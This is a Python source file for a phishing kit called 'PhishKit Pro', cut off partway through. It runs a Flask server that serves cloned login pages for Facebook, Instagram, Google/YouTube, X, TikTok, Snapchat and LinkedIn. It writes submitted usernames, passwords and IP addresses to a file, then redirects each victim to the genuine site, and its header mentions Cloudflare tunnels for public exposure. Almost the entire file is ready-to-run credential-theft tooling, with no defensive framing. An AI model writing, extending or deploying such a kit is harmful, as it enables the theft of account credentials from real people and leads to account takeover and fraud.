#!/usr/bin/env python3
"""
PhishKit Pro — Multi-Platform Credential Harvester
Platforms : 22
Tunnels   : Local | Cloudflare (trycloudflare.com)
Usage     : python phisher.py
Requires  : pip install flask requests colorama
"""

import os, sys, json, socket, subprocess, threading, time, signal
from datetime import datetime
from flask import Flask, request, redirect, render_template_string

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system('pip install colorama -q')
    from colorama import init, Fore, Style
    init(autoreset=True)

# ─── Flask app ────────────────────────────────────────────────────────────────
app = Flask(__name__)

CREDS_FILE = 'captured_creds.txt'
active_platform = {}   # {name, redirect_url}

# ─── Credential Logger ────────────────────────────────────────────────────────
def log_cred(platform, data, ip):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"\n{'='*60}\n[{ts}] PLATFORM: {platform}\nIP      : {ip}\n"
    for k, v in data.items():
        line += f"{k.upper():10}: {v}\n"
    line += '='*60
    with open(CREDS_FILE, 'a') as f:
        f.write(line + '\n')
    print(Fore.GREEN + f'\n  ✓ CREDENTIALS CAPTURED [{platform}]')
    print(Fore.YELLOW + f'  IP: {ip}')
    for k, v in data.items():
        print(Fore.CYAN + f'  {k.upper():10}: {v}')
    print()

# ─── Flask Routes ─────────────────────────────────────────────────────────────
@app.route('/')
def index():
    p = active_platform.get('name', 'facebook')
    return render_template_string(PAGES[p])

@app.route('/login', methods=['POST'])
def capture():
    p    = active_platform.get('name', 'facebook')
    rurl = active_platform.get('redirect', 'https://facebook.com')
    data = {k: v for k, v in request.form.items()}
    ip   = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_cred(p, data, ip)
    return redirect(rurl)

# ─── Platform Registry ────────────────────────────────────────────────────────
PLATFORMS = {
    '1':  ('Facebook',       'https://facebook.com',       'facebook'),
    '2':  ('Instagram',      'https://instagram.com',      'instagram'),
    '3':  ('Google',         'https://google.com',         'google'),
    '4':  ('YouTube',        'https://youtube.com',        'youtube'),
    '5':  ('Twitter / X',    'https://x.com',              'twitter'),
    '6':  ('TikTok',         'https://tiktok.com',         'tiktok'),
    '7':  ('Snapchat',       'https://snapchat.com',       'snapchat'),
    '8':  ('LinkedIn',       'https://linkedin.com',       'linkedin'),
    '9':  ('WhatsApp Web',   'https://web.whatsapp.com',   'whatsapp'),
    '10': ('Netflix',        'https://netflix.com',        'netflix'),
    '11': ('Spotify',        'https://spotify.com',        'spotify'),
    '12': ('PayPal',         'https://paypal.com',         'paypal'),
    '13': ('Amazon',         'https://amazon.com',         'amazon'),
    '14': ('Microsoft',      'https://microsoft.com',      'microsoft'),
    '15': ('Apple ID',       'https://appleid.apple.com',  'apple'),
    '16': ('Discord',        'https://discord.com',        'discord'),
    '17': ('Telegram',       'https://web.telegram.org',   'telegram'),
    '18': ('Reddit',         'https://reddit.com',         'reddit'),
    '19': ('GitHub',         'https://github.com',         'github'),
    '20': ('Steam',          'https://store.steampowered.com', 'steam'),
    '21': ('Twitch',         'https://twitch.tv',          'twitch'),
    '22': ('Pinterest',      'https://pinterest.com',      'pinterest'),
}

# ─── Login Page Templates ─────────────────────────────────────────────────────
PAGES = {}


# ─── Login Page Templates (Mobile-First, Pixel Perfect) ──────────────────────
PAGES = {}

# ── Facebook (Mobile) ─────────────────────────────────────────────────────────
PAGES['facebook'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Facebook</title>
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:36px}
.logo{color:#1877f2;font-size:42px;font-weight:700;letter-spacing:-1px;margin-bottom:20px;text-align:center;font-family:Georgia,serif}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px;width:100%;max-width:396px;margin:0 16px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;color:#1c1e21;background:#fff;-webkit-appearance:none;appearance:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn-login{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px;-webkit-appearance:none}
.btn-login:active{background:#166fe5}
.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;padding:8px 0}
.divider{border:none;border-top:1px solid #dadde1;margin:16px 0}
.btn-new{display:block;width:fit-content;margin:0 auto;padding:14px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;-webkit-appearance:none}
.btn-new:active{background:#36a420}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#737373;padding:0 16px 24px}
.footer a{color:#737373;text-decoration:none}
.footer a:hover{text-decoration:underline}
</style></head>
<body>
<div class="logo">facebook</div>
<div class="card">
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Mobile number or email" autocomplete="username" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgotten password?</a>
  <hr class="divider">
  <button class="btn-new">Create new account</button>
</div>
<div class="footer">
  <a href="#">English (UK)</a> · <a href="#">বাংলা</a> · <a href="#">हिन्दी</a><br><br>
  <a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a><br><br>
  Meta © 2024
</div>
</body></html>'''

# ── Instagram (Mobile) ────────────────────────────────────────────────────────
PAGES['instagram'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/De-Dwpd5CHc.png">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.wrap{width:100%;max-width:350px;padding:0 16px}
.logo-wrap{text-align:center;margin-bottom:32px;margin-top:40px}
.logo-wrap img{width:175px}
.logo-text{font-size:32px;font-weight:400;font-family:'Billabong',Georgia,serif;color:#262626;letter-spacing:-1px}
input{width:100%;padding:9px 10px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;outline:none;color:#262626;-webkit-appearance:none}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e;font-size:14px}
.btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;margin-bottom:16px;opacity:1;-webkit-appearance:none}
.btn:active{background:#0086db}
.or-wrap{display:flex;align-items:center;gap:16px;margin:8px 0 16px}
.or-line{flex:1;height:1px;background:#dbdbdb}
.or-text{font-size:13px;font-weight:600;color:#8e8e8e}
.fb-btn{display:flex;align-items:center;justify-content:center;gap:8px;background:none;border:none;color:#385185;font-size:14px;font-weight:600;cursor:pointer;width:100%;padding:8px 0}
.fb-icon{width:20px;height:20px}
.forgot{display:block;text-align:center;color:#00376b;font-size:12px;text-decoration:none;margin-top:16px}
.register-box{border-top:1px solid #dbdbdb;margin-top:10px;padding:16px;text-align:center;font-size:14px;color:#262626}
.register-box a{color:#0095f6;font-weight:600;text-decoration:none}
.app-badges{text-align:center;margin:24px 0 16px;font-size:14px;color:#262626}
.badges{display:flex;justify-content:center;gap:8px;margin-top:12px}
.badge{display:inline-block;background:#3c3c3c;color:#fff;padding:6px 14px;border-radius:6px;font-size:12px;font-weight:600}
</style></head>
<body>
<div class="wrap">
  <div class="logo-wrap">
    <div class="logo-text">Instagram</div>
  </div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone number, username or email" autocomplete="username" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn" type="submit">Log in</button>
  </form>
  <div class="or-wrap"><div class="or-line"></div><span class="or-text">OR</span><div class="or-line"></div></div>
  <button class="fb-btn">
    <svg class="fb-icon" viewBox="0 0 40 40" fill="#385185"><path d="M20 0C9 0 0 9 0 20s9 20 20 20 20-9 20-20S31 0 20 0zm5 14h-3c-.4 0-1 .5-1 1v2h4l-.5 4H21v12h-4V21h-3v-4h3v-2c0-3.3 2-5 5-5h3v4z"/></svg>
    Log in with Facebook
  </button>
  <a class="forgot" href="#">Forgot password?</a>
</div>
<div class="register-box">Don't have an account? <a href="#">Sign up.</a></div>
<div class="app-badges">
  Get the app.
  <div class="badges">
    <span class="badge">▶ Google Play</span>
    <span class="badge">⊞ Microsoft</span>
  </div>
</div>
</body></html>'''

# ── Google (Mobile — exact 2-step flow, email page) ───────────────────────────
PAGES['google'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in – Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:'Google Sans',Roboto,'Helvetica Neue',sans-serif;color:#202124;min-height:100vh;display:flex;flex-direction:column}
.container{flex:1;display:flex;flex-direction:column;padding:48px 24px 24px;max-width:400px;width:100%;margin:0 auto}
.g-logo{display:flex;justify-content:flex-start;margin-bottom:40px}
.g-logo svg{width:74px;height:24px}
.card-inner{flex:1}
.title{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
.subtitle{font-size:16px;color:#202124;margin-bottom:32px}
.input-wrap{position:relative;margin-bottom:4px}
.input-wrap input{width:100%;padding:15px 14px 15px;border:1px solid #747775;border-radius:4px;font-size:16px;color:#202124;outline:none;background:#fff;-webkit-appearance:none;font-family:inherit}
.input-wrap input:focus{border-color:#0b57d0;border-width:2px;padding:14px 13px 14px}
.input-wrap label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:#444746;pointer-events:none;transition:all .15s;background:#fff;padding:0 2px}
.input-wrap input:focus ~ label,
.input-wrap input:not(:placeholder-shown) ~ label{top:0;font-size:12px;color:#0b57d0}
.input-wrap input:not(:focus):not(:placeholder-shown) ~ label{color:#444746}
.hint{font-size:12px;color:#444746;margin:4px 0 24px 14px}
.forgot{color:#0b57d0;font-size:14px;text-decoration:none;display:block;margin-bottom:32px}
.forgot:hover{text-decoration:underline}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:auto;padding-top:24px}
.btn-create{color:#0b57d0;font-size:14px;font-weight:500;background:none;border:none;cursor:pointer;padding:10px 0;font-family:inherit}
.btn-next{background:#0b57d0;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;-webkit-appearance:none}
.btn-next:active{background:#0842a0}
.pw-section{display:none}
.footer{text-align:center;padding:16px;font-size:12px;color:#444746}
.footer a{color:#0b57d0;text-decoration:none}
</style></head>
<body>
<div class="container">
  <div class="g-logo">
    <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
      <path fill="#4285F4" d="M31.36 12.27c0 5.01-3.92 8.71-8.73 8.71-5 0-8.97-3.98-8.97-8.99 0-5 3.97-8.99 8.97-8.99 2.69 0 4.64 1.05 6.1 2.44l-1.72 1.72c-1.04-.97-2.45-1.73-4.38-1.73-3.58 0-6.38 2.88-6.38 6.56s2.8 6.56 6.38 6.56c4.09 0 5.62-2.93 5.86-4.45h-5.86v-2.27h9.6c.09.5.13.98.13 1.44z"/>
      <path fill="#EA4335" d="M55.2 12c0 4.97-3.88 8.98-8.68 8.98-4.81 0-8.69-4.01-8.69-8.98 0-4.98 3.88-8.98 8.69-8.98 4.8 0 8.68 4 8.68 8.98zm-3.8 0c0-3.1-2.25-5.23-4.88-5.23-2.64 0-4.88 2.13-4.88 5.23s2.24 5.23 4.88 5.23c2.63 0 4.88-2.13 4.88-5.23z"/>
      <path fill="#FBBC05" d="M72.2 12c0 4.97-3.88 8.98-8.68 8.98-4.81 0-8.69-4.01-8.69-8.98 0-4.97 3.88-8.98 8.69-8.98 4.8 0 8.68 4.01 8.68 8.98zm-3.8 0c0-3.1-2.25-5.23-4.88-5.23-2.64 0-4.88 2.13-4.88 5.23s2.24 5.23 4.88 5.23c2.63 0 4.88-2.13 4.88-5.23z"/>
      <path fill="#4285F4" d="M8.61 7.35V11H.07C.07 8.01 1.89 5.44 4.5 4.11L5.98 7.1c-1.1.6-1.92 1.56-2.25 2.77l4.88-2.52zM0 12c0-1.47.28-2.87.77-4.17l3.47 3.47c-.01.23-.02.47-.02.7 0 .44.04.87.11 1.29L.56 15.09C.2 14.13 0 13.08 0 12zm5.98 4.9L4.5 19.89C1.89 18.56.07 15.99.07 13H3.73c.33 1.21 1.15 2.17 2.25 2.77l-.01.02-.02.11.03-.01z"/>
    </svg>
  </div>
  <div class="card-inner">
    <div class="title">Sign in</div>
    <div class="subtitle">Use your Google Account</div>
    <form action="/login" method="POST" id="loginForm">
      <div class="input-wrap">
        <input type="text" name="email" id="emailInput" placeholder=" " autocomplete="username" required>
        <label for="emailInput">Email or phone</label>
      </div>
      <div class="hint">Not your computer? Use a private browsing window to sign in.</div>
      <div class="input-wrap pw-section" id="pwSection">
        <input type="password" name="password" id="pwInput" placeholder=" " autocomplete="current-password">
        <label for="pwInput">Enter your password</label>
      </div>
      <a class="forgot" href="#" id="forgotLink" style="display:none">Forgot password?</a>
      <div class="actions">
        <button class="btn-create" type="button">Create account</button>
        <button class="btn-next" type="button" id="nextBtn">Next</button>
      </div>
    </form>
  </div>
</div>
<div class="footer"><a href="#">English (United States)</a> · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
<script>
let step = 1;
document.getElementById('nextBtn').addEventListener('click', function(){
  if(step === 1){
    var email = document.getElementById('emailInput').value.trim();
    if(!email){ document.getElementById('emailInput').focus(); return; }
    document.getElementById('pwSection').style.display = 'block';
    document.getElementById('forgotLink').style.display = 'block';
    document.querySelector('.input-wrap:first-of-type input').readOnly = true;
    step = 2;
  } else {
    document.getElementById('loginForm').submit();
  }
});
document.getElementById('emailInput').addEventListener('keydown', function(e){ if(e.key==='Enter'){ e.preventDefault(); document.getElementById('nextBtn').click(); } });
document.getElementById('pwInput') && document.getElementById('pwInput').addEventListener('keydown', function(e){ if(e.key==='Enter'){ e.preventDefault(); document.getElementById('loginForm').submit(); } });
</script>
</body></html>'''

# ── YouTube (uses Google sign-in) ──────────────────────────────────────────────
PAGES['youtube'] = PAGES['google']

# ── Twitter / X (Mobile) ──────────────────────────────────────────────────────
PAGES['twitter'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Log in to X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#e7e9ea;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.top-bar{width:100%;display:flex;justify-content:center;padding:16px 0 0}
.x-icon{font-size:28px;font-weight:900;color:#fff;letter-spacing:-2px}
.container{width:100%;max-width:400px;padding:32px 20px}
h1{font-size:31px;font-weight:700;color:#e7e9ea;margin-bottom:32px}
.btn-google{width:100%;padding:12px;background:#fff;color:#0f1419;border:1px solid #cfd9de;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;-webkit-appearance:none}
.btn-apple{width:100%;padding:12px;background:#fff;color:#0f1419;border:1px solid #cfd9de;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;-webkit-appearance:none}
.or-row{display:flex;align-items:center;gap:12px;margin:12px 0;color:#71767b;font-size:15px}
.or-line{flex:1;height:1px;background:#2f3336}
input{width:100%;padding:14px;background:#000;border:1px solid #536471;border-radius:4px;font-size:17px;color:#e7e9ea;outline:none;margin-bottom:12px;-webkit-appearance:none;font-family:inherit}
input:focus{border-color:#1d9bf0}
input::placeholder{color:#71767b}
.btn-login{width:100%;padding:14px;background:#eff3f4;color:#0f1419;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px;-webkit-appearance:none}
.btn-login:active{background:#d7dbdc}
.forgot{color:#1d9bf0;font-size:15px;text-decoration:none;display:block;text-align:center;margin:20px 0}
.signup-row{font-size:15px;color:#71767b;text-align:center;margin-top:40px}
.signup-row a{color:#1d9bf0;text-decoration:none;font-weight:400}
</style></head>
<body>
<div class="top-bar"><div class="x-icon">𝕏</div></div>
<div class="container">
  <h1>Sign in to X</h1>
  <button class="btn-google">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Sign in with Google
  </button>
  <button class="btn-apple">🍎 Sign in with Apple</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone, email, or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn-login" type="submit">Sign in</button>
  </form>
  <a class="forgot" href="#">Forgot password?</a>
  <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body></html>'''

# ── TikTok (Mobile) ───────────────────────────────────────────────────────────
PAGES['tiktok'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>TikTok - Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:'Proxima Nova',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.header{display:flex;align-items:center;justify-content:center;padding:16px;border-bottom:1px solid #f1f1f2;position:relative}
.close-btn{position:absolute;left:16px;font-size:22px;color:#161823;background:none;border:none;cursor:pointer}
.header-title{font-size:17px;font-weight:700;color:#161823}
.container{flex:1;padding:24px 16px;max-width:420px;width:100%;margin:0 auto}
h1{font-size:24px;font-weight:700;color:#161823;margin-bottom:4px;text-align:center}
.subtitle{font-size:15px;color:#161823;text-align:center;margin-bottom:32px}
.method-btn{width:100%;padding:14px 16px;background:#fff;border:1.5px solid rgba(22,24,35,.12);border-radius:2px;font-size:15px;font-weight:600;color:#161823;cursor:pointer;display:flex;align-items:center;gap:12px;margin-bottom:10px;-webkit-appearance:none}
.method-btn .icon{font-size:22px;width:28px;text-align:center}
.divider{display:flex;align-items:center;gap:12px;margin:20px 0;color:#b0b0b0;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e3e3e4}
input{width:100%;padding:12px 14px;border:1.5px solid rgba(22,24,35,.12);border-radius:2px;font-size:15px;color:#161823;outline:none;margin-bottom:10px;background:#fff;-webkit-appearance:none;font-family:inherit}
input:focus{border-color:#fe2c55}
input::placeholder{color:#b0b0b0}
.btn-login{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:2px;font-size:16px;font-weight:600;cursor:pointer;margin-top:4px;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#d4173e}
.terms{font-size:12px;color:#7c7c7c;text-align:center;margin-top:16px;line-height:1.5}
.terms a{color:#fe2c55;text-decoration:none}
.signup-bar{text-align:center;padding:16px;border-top:1px solid #f1f1f2;font-size:15px;color:#161823;position:sticky;bottom:0;background:#fff}
.signup-bar a{color:#fe2c55;font-weight:700;text-decoration:none}
</style></head>
<body>
<div class="header">
  <button class="close-btn">✕</button>
  <div class="header-title">Log in</div>
</div>
<div class="container">
  <h1>Log in to TikTok</h1>
  <p class="subtitle">Manage your account, check notifications, comment on videos, and more.</p>
  <button class="method-btn"><span class="icon">📱</span> Use phone / email / username</button>
  <button class="method-btn">
    <svg class="icon" width="24" height="24" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="method-btn"><span class="icon">🍎</span> Continue with Apple</button>
  <div class="divider">or use email / username</div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn-login" type="submit">Log in</button>
  </form>
  <div class="terms">By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.</div>
</div>
<div class="signup-bar">Don't have an account? <a href="#">Sign up</a></div>
</body></html>'''

# ── Snapchat (Mobile) ─────────────────────────────────────────────────────────
PAGES['snapchat'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fffc00;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.top-logo{padding:40px 0 24px;text-align:center}
.ghost{font-size:72px;line-height:1}
.card{background:#fff;border-radius:20px 20px 0 0;flex:1;width:100%;max-width:480px;padding:32px 24px;box-shadow:0 -4px 20px rgba(0,0,0,.08)}
h1{font-size:26px;font-weight:800;color:#0d0d0d;margin-bottom:24px;text-align:center}
.input-label{font-size:13px;font-weight:700;color:#7c7c7c;margin-bottom:6px;display:block;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:14px 16px;border:2px solid #e8e8e8;border-radius:10px;font-size:16px;color:#0d0d0d;outline:none;margin-bottom:16px;background:#fff;-webkit-appearance:none;font-family:inherit}
input:focus{border-color:#fffc00;box-shadow:0 0 0 3px rgba(255,252,0,.3)}
.btn-login{width:100%;padding:16px;background:#0d0d0d;color:#fffc00;border:none;border-radius:10px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:16px;-webkit-appearance:none;font-family:inherit;letter-spacing:.5px}
.btn-login:active{background:#333}
.forgot{display:block;text-align:center;color:#0d0d0d;font-size:15px;font-weight:700;text-decoration:none;margin-bottom:24px}
.or-row{display:flex;align-items:center;gap:12px;margin:8px 0 16px;color:#ccc;font-size:13px}
.or-line{flex:1;height:1px;background:#eee}
.btn-sso{width:100%;padding:14px;background:#fff;border:2px solid #e8e8e8;border-radius:10px;font-size:15px;font-weight:700;color:#0d0d0d;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;-webkit-appearance:none}
.signup-row{text-align:center;font-size:15px;color:#7c7c7c;margin-top:24px}
.signup-row a{color:#0d0d0d;font-weight:800;text-decoration:none}
</style></head>
<body>
<div class="top-logo"><div class="ghost">👻</div></div>
<div class="card">
  <h1>Log in to Snapchat</h1>
  <form action="/login" method="POST">
    <span class="input-label">Username or Email</span>
    <input type="text" name="email" autocomplete="username" required>
    <span class="input-label">Password</span>
    <input type="password" name="password" autocomplete="current-password" required>
    <button class="btn-login" type="submit">LOG IN</button>
  </form>
  <a class="forgot" href="#">Forgot your password?</a>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <button class="btn-sso">🔵 Continue with Google</button>
  <button class="btn-sso">🍎 Continue with Apple</button>
  <div class="signup-row">Don't have an account? <a href="#">Sign Up</a></div>
</div>
</body></html>'''

# ── LinkedIn (Mobile) ─────────────────────────────────────────────────────────
PAGES['linkedin'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>LinkedIn: Log In or Sign Up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column}
.nav{padding:14px 20px;border-bottom:1px solid #e0e0e0;display:flex;align-items:center;justify-content:space-between}
.li-logo{display:flex;align-items:center;gap:2px}
.li-icon{background:#0a66c2;color:#fff;font-size:18px;font-weight:800;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:4px}
.nav-links{display:flex;gap:12px;align-items:center}
.nav-links a{color:#0a66c2;font-size:14px;font-weight:600;text-decoration:none}
.nav-links .join-btn{background:#0a66c2;color:#fff;padding:8px 16px;border-radius:9999px;font-size:14px;font-weight:600;text-decoration:none}
.container{flex:1;padding:32px 20px;max-width:440px;width:100%;margin:0 auto}
h1{font-size:28px;font-weight:300;color:#181818;margin-bottom:28px}
.btn-google{width:100%;padding:13px;background:#fff;border:1.5px solid rgba(0,0,0,.3);border-radius:9999px;font-size:16px;font-weight:600;color:#181818;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;-webkit-appearance:none}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#999;font-size:14px;font-weight:600}
.or-line{flex:1;height:1px;background:#e0e0e0}
.field{margin-bottom:16px}
.field label{display:block;font-size:14px;color:#181818;font-weight:600;margin-bottom:6px}
.field input{width:100%;padding:13px 14px;border:1px solid rgba(0,0,0,.3);border-radius:4px;font-size:16px;color:#181818;outline:none;-webkit-appearance:none;background:#fff;font-family:inherit}
.field input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2;border-width:1.5px}
.show-pw{display:flex;justify-content:flex-end;margin-top:4px;margin-bottom:8px}
.show-pw a{color:#0a66c2;font-size:14px;font-weight:600;text-decoration:none}
.btn-login{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:9999px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:16px;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#004182}
.forgot{display:block;text-align:center;color:#0a66c2;font-size:14px;font-weight:600;text-decoration:none;margin-bottom:24px}
.join-row{text-align:center;font-size:16px;color:#181818;padding-top:16px;border-top:1px solid #e0e0e0}
.join-row a{color:#0a66c2;font-weight:600;text-decoration:none}
</style></head>
<body>
<nav class="nav">
  <div class="li-logo"><div class="li-icon">in</div></div>
  <div class="nav-links">
    <a href="#">Sign in</a>
    <a href="#" class="join-btn">Join now</a>
  </div>
</nav>
<div class="container">
  <h1>Sign in</h1>
  <button class="btn-google">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <div class="field"><label>Email or phone</label><input type="text" name="email" autocomplete="username" required></div>
    <div class="field"><label>Password</label><input type="password" name="password" autocomplete="current-password" required></div>
    <div class="show-pw"><a href="#">Forgot password?</a></div>
    <button class="btn-login" type="submit">Sign in</button>
  </form>
